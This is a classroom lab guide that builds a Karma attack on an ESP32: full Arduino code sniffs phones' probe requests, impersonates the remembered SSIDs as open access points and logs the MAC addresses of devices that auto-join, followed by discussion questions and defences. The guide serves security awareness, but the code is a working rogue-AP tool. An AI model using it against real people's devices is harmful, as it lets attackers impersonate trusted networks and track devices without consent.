# "The $100 Trick" — How a Wi-Fi Pineapple Steals Trust (Karma Attack)
### (ESP32 DevKit V1 only — no additional hardware)

> 🚨 **FOR EDUCATIONAL PURPOSES ONLY.** This lab is provided solely to teach cybersecurity awareness in a supervised classroom setting, with informed consent from everyone involved. Do not use these techniques against real people, devices, or networks without explicit authorization — doing so may violate computer-misuse, wiretapping, or other laws in your jurisdiction.

Hak5's Wi-Fi Pineapple costs ~$100+. Its most famous trick is the **Karma attack**, and the secret is almost embarrassingly simple. In the [Ghost of Networks Past](01-ghost-of-networks-past-en.md) project we saw that phones constantly shout the names of networks they remember. The Pineapple's move is:

> **"I heard you asking for `HomeNet`. Yes — *I* am `HomeNet`. Connect to me."**

The phone, believing it found a trusted, previously-saved network, **connects automatically — no user action, no warning.** This guide builds a working, minimal version of that exact trick on a single ESP32, so students *see* their own phone silently betray them.

> Classroom demo, consent required. The device only invites *connection* to a fake AP — it grants no internet and captures no traffic. The whole point is to witness the auto-connect, then discuss defense.

---

## ⚠️ Read This First: Ethical and Legal Framework

- **Consent + own devices only:** Every phone in the demo belongs to a consenting student who knows what's about to happen.
- **Impersonating a real SSID is powerful — keep it in the room:** Only mimic network names in this controlled setting. Never run this in public; impersonating others' networks outside a lab is illegal in most places.
- **No data captured:** This build offers no login form and logs no traffic. It proves the *auto-connect*, nothing more.
- **The goal is awareness:** "The expensive hacker gadget's core trick is just *politely answering* your phone's questions."

---

## 1. Required Materials

- ESP32 DevKit V1
- Micro-USB data cable
- A volunteer phone with at least one **saved/remembered** Wi-Fi network (and "auto-join" on)
- Arduino IDE with ESP32 board package

Uses (all bundled): `WiFi.h`, `esp_wifi.h`

---

## 2. How It Works (Conceptual Overview)

1. The ESP32 enters **promiscuous mode** and listens for **probe requests** (phones asking "is `X` here?")
2. It collects the requested SSID names into a live list — these are networks phones *trust*
3. The ESP32 then **broadcasts an open AP using one of those exact names** (the Karma response)
4. A phone with that network saved and "auto-join" on sees a familiar name and **connects on its own**
5. The Serial Monitor shows: the name it heard → the fake AP it created → the device that took the bait

Real Pineapples juggle *many* names at once with dedicated radios. One ESP32 does it **one impersonated name at a time**, cycling through what it hears — enough to prove the concept convincingly.

---

## 3. Full Code

```cpp
// karma_demo.ino
// Minimal Karma-attack demonstrator: hears trusted SSIDs, impersonates them one at a time.
// Classroom awareness use only, with consent. Grants no internet, captures no traffic.

#include <WiFi.h>
#include "esp_wifi.h"

#define MAX_NAMES 20
String trusted[MAX_NAMES];
int nameCount = 0;
int impersonateIdx = 0;
unsigned long lastSwap = 0;
const unsigned long SWAP_MS = 8000;   // impersonate each heard name for 8s
int sniffChannel = 1;

// --- collect a heard SSID (deduplicated) ---
void remember(const String& s) {
  if (s.length() == 0) return;
  for (int i = 0; i < nameCount; i++) if (trusted[i] == s) return;
  if (nameCount < MAX_NAMES) {
    trusted[nameCount++] = s;
    Serial.printf("[HEARD]  A phone here trusts: \"%s\"  (now impersonatable)\n", s.c_str());
  }
}

// --- promiscuous callback: pull SSID out of probe requests ---
void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* p = pkt->payload;
  if (((p[0] & 0xF0) >> 4) != 4) return;      // subtype 4 = probe request
  const uint8_t* tag = p + 24;
  if (tag[0] != 0) return;                     // tag 0 = SSID
  uint8_t len = tag[1];
  if (len == 0 || len > 32) return;            // skip broadcast/wildcard probes
  String ssid = "";
  for (int i = 0; i < len; i++) ssid += (char)tag[2 + i];
  remember(ssid);
}

void startSniffing() {
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
  esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
}

void impersonate(const String& name) {
  esp_wifi_set_promiscuous(false);             // stop sniffing while we broadcast
  WiFi.mode(WIFI_AP);
  WiFi.softAP(name.c_str());                   // OPEN AP named exactly like a trusted net
  Serial.printf("\n>>> KARMA: now broadcasting fake OPEN AP \"%s\"\n", name.c_str());
  Serial.println(">>> Watch for a phone to AUTO-CONNECT (no tapping!)...");
}

int lastClientCount = 0;
void reportClients() {
  wifi_sta_list_t list;
  esp_wifi_ap_get_sta_list(&list);
  if (list.num > lastClientCount) {
    uint8_t* m = list.sta[list.num - 1].mac;
    Serial.printf("!!! TOOK THE BAIT: device %02X:%02X:%02X:%02X:%02X:%02X auto-joined \"%s\"\n",
                  m[0],m[1],m[2],m[3],m[4],m[5], trusted[impersonateIdx].c_str());
  }
  lastClientCount = list.num;
}

void setup() {
  Serial.begin(115200);
  delay(400);
  Serial.println("\n=== Karma Demo: listening for trusted network names ===");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  startSniffing();
  lastSwap = millis();
}

void loop() {
  // Phase 1: while we have nothing to impersonate, keep sniffing + channel hopping
  if (nameCount == 0) {
    delay(400);
    sniffChannel = (sniffChannel % 11) + 1;
    esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
    return;
  }

  // Phase 2: cycle through heard names, impersonating each for a while
  static bool broadcasting = false;
  if (!broadcasting || millis() - lastSwap > SWAP_MS) {
    impersonateIdx = (impersonateIdx + 1) % nameCount;
    impersonate(trusted[impersonateIdx]);
    lastClientCount = 0;
    broadcasting = true;
    lastSwap = millis();
  }
  reportClients();
  delay(500);
}
```

---

## 4. Setup and Test Steps

1. On the volunteer phone: confirm it has a saved network (e.g. a home/hotspot SSID) and that **auto-join is ON**. **Forget** the classroom's real Wi-Fi first so it doesn't interfere.
2. Upload the code, open the Serial Monitor at 115200 baud.
3. Leave the phone's Wi-Fi **on**. Within seconds you'll see `[HEARD]` lines — names the phone trusts.
4. The ESP32 then starts impersonating those names one by one (`>>> KARMA...`).
5. When the impersonated name matches a saved network with auto-join, watch for `!!! TOOK THE BAIT` — the phone connected **without anyone touching it.**

> If nothing auto-joins: modern iOS/Android resist Karma for *encrypted* saved networks. It works most reliably against **open** networks the phone remembers (airport/café "free wifi"). That resistance is itself the lesson — see discussion.

---

## 5. Classroom Discussion Activity

- "Nobody tapped 'connect.' So who decided to join the fake network?" (the phone's auto-join did)
- "Why did *open* saved networks fall for it but *WPA2* ones often didn't?" (the ESP32 can't prove the password, so encrypted networks reject the impostor — a built-in defense)
- "A $100 Pineapple does exactly this with more radios. What did you *really* pay for?"
- "How is this the natural sequel to the Ghost of Networks Past leak?"

---

## 6. Defense / Awareness Takeaways

| Risk | Mitigation |
|---|---|
| Auto-join to remembered open networks | **Turn off auto-join** for open/public networks |
| Phone trusts a name, not the real AP | **Forget** old open networks (airports, cafés, hotels) |
| Karma against saved SSIDs | Prefer WPA2/WPA3 networks — they resist name-only impersonation |
| Silent connection | Turn Wi-Fi **off** in public; use mobile data + VPN |

---

## 7. Common Issues

| Issue | Fix |
|---|---|
| No `[HEARD]` names | Phone may suppress named probes when locked — unlock it, or add an older device |
| Names heard but no auto-join | Expected for WPA2 saved nets; test with an **open** saved network (make a phone hotspot named the same, save it, then run) |
| Phone connects then drops | Normal — there's no internet; the point is the *initial* auto-join |
| Re-upload fails | Hold BOOT, tap EN/RST, release BOOT, then upload |

---

## 8. Student Checklist

- [ ] Confirmed a phone with a saved open network + auto-join on
- [ ] Saw the ESP32 *hear* trusted network names
- [ ] Watched a phone **auto-connect** to the impersonated name
- [ ] Explained why WPA2/WPA3 saved networks resisted the trick
- [ ] Wrote 2-3 settings that stop their own phone from being Karma'd
